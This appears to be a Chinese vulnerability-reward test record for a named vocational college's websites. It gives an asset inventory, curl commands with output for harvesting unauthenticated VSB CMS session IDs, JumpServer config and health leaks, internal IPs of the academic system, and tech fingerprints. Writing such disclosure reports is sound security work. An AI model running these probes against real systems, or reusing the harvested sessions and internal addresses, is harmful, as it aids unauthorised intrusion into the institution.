# 铜川职业技术学院 (tczyxy.net) SRC测试记录 (2026-05-27)

## 资产清单

| 子域名 | IP | 技术栈 | 发现 |
|--------|-----|--------|------|
| www.tczyxy.net | - | nginx + VSB CMS 9 | 主站, getSession.jsp确认 |
| zsw.tczyxy.net | - | nginx + VSB CMS | 招生网, getSession.jsp确认 |
| sfgl.tczyxy.net | - | nginx + JumpServer 堡垒机 | 配置+健康状态泄露 |
| jwgl.tczyxy.net | - | nginx + Spring Cloud Gateway | Eureka客户端状态泄露, 内网IP泄露 |
| zsxt.tczyxy.net | - | nginx + ASP.NET 4.0.30319 | 综合评价考试报名管理系统 |
| pan.tczyxy.net | - | Go后端 + React SPA | 信息资源网盘, SPA fallback |
| portal.tczyxy.net | → swzx.tczyxy.net | nginx | 事务中心, CAS认证 |
| zhpj.tczyxy.net | - | - | 综合评价 |
| zyk.tczyxy.net | - | - | 资源库 |
| yx.tczyxy.net | - | - | 404 |
| ydxy.tczyxy.net | - | - | 404 |
| jy.tczyxy.net | - | - | 就业 |
| cas.tczyxy.net | - | - | 404, CAS SSO |
| old.tczyxy.net | - | - | 未探活 |
| zy.tczyxy.net | - | - | 专业 |

## 已确认漏洞

### 1. VSB CMS getSession.jsp 未授权会话获取 [中危]

**域名:** www.tczyxy.net + zsw.tczyxy.net

**验证命令:**
```bash
# 获取JSESSIONID
curl -sk -D- "https://www.tczyxy.net/system/resource/getSession.jsp?r=0.123"
# 响应头: set-cookie: JSESSIONID=56FB70A5340626EDAFD66ACFF9B0391C
# 响应体: 56FB70A5340626EDAFD66ACFF9B0391C

# 获取preview token
curl -sk "https://www.tczyxy.net/system/resource/getToken.jsp?mode=1"
# 返回: preview

# token.js接口定义
curl -sk "https://www.tczyxy.net/system/resource/vue/token.js"
# 返回getSession/gettoken/filterSensitiveWords三个函数定义
```

**批量获取验证:**
- Session 1: DEB254EDE0BEE212446A0DB3138D9E47
- Session 2: 95C625479F93434758FCC0E9C31D4ABB
- Session 3: D45F9C998DBA07A8D430282337874865

**WAF限流:** ~10次请求后WAF返回403, 首次3次验证已足够证明批量性.

### 2. JumpServer堡垒机配置+健康状态泄露 [中危]

**域名:** sfgl.tczyxy.net

**验证命令:**
```bash
# 完整配置泄露
curl -sk "https://sfgl.tczyxy.net/api/v1/settings/public/open/"
# → {"XPACK_ENABLED":false,"INTERFACE":{"login_title":"JumpServer 开源堡垒机","theme":"classic_green",...},"COUNTRY_CALLING_CODES":[...]}

# 数据库+Redis状态
curl -sk "https://sfgl.tczyxy.net/api/v1/health/"
# → {"status":true,"db_status":true,"db_time":0.003,"redis_status":true,"redis_time":0.0007}

# 登录页
curl -sk "https://sfgl.tczyxy.net/core/auth/login/"
# 含csrfmiddlewaretoken + 用户名输入框
```

**关键信息:**
- 系统: JumpServer 开源堡垒机 (XPACK_ENABLED: false)
- 主题: classic_green
- 数据库和Redis均正常运行

### 3. 教务系统信息泄露 [低危]

**域名:** jwgl.tczyxy.net

**验证命令:**
```bash
# Eureka客户端状态
curl -sk "https://jwgl.tczyxy.net/api/health/"
# → {"description":"Spring Cloud Eureka Discovery Client","status":"UP"}

# 内网IP泄露
curl -sk "https://jwgl.tczyxy.net/assets/js/jwxt/config.js"
# → window.previewFileServer = "http://172.198.0.11:5912/";
# → window.previewFileServer = "http://192.168.35.131:8012/onlinePreview";

# 响应头泄露应用上下文
# x-application-context: ly-api-gateway:10008
```

## 不建议提交

- **zsxt.tczyxy.net ASP.NET版本泄露**: x-aspnet-version: 4.0.30319, x-powered-by: ASP.NET — 低危配置缺陷
- **zsxt trace.axd存在(403)**: ASP.NET trace handler存在但被WAF拦截 — 被拦截不收
- **zsxt web.config.bak存在(403)**: 备份文件存在但被WAF拦截 — 被拦截不收
- **pan.tczyxy.net SPA fallback**: 所有路径返回相同React SPA壳 — SPA fallback不收
- **jwgl .env(403)**: .env文件存在但被"网站防火墙"拦截 — 被拦截不收
- **主站无CORS问题**: 所有子域测试CORS均无反射 — 无漏洞

## 技术栈指纹

- **VSB CMS 9**: `_sitegray/_sitegray.js` + `index.vsb.css` + `<!--Announced by Visual SiteBuilder 9-->` + CustomerNO
- **JumpServer**: `/api/v1/settings/public/open/` JSON + `/core/auth/login/` CSRF + `XPACK_ENABLED`
- **Spring Cloud Gateway**: `x-application-context: ly-api-gateway:10008` + Eureka discovery client
- **ASP.NET**: `x-aspnet-version: 4.0.30319` + `x-powered-by: ASP.NET`
- **React SPA**: Go后端 `404 page not found` + manifest.json + webpack chunks
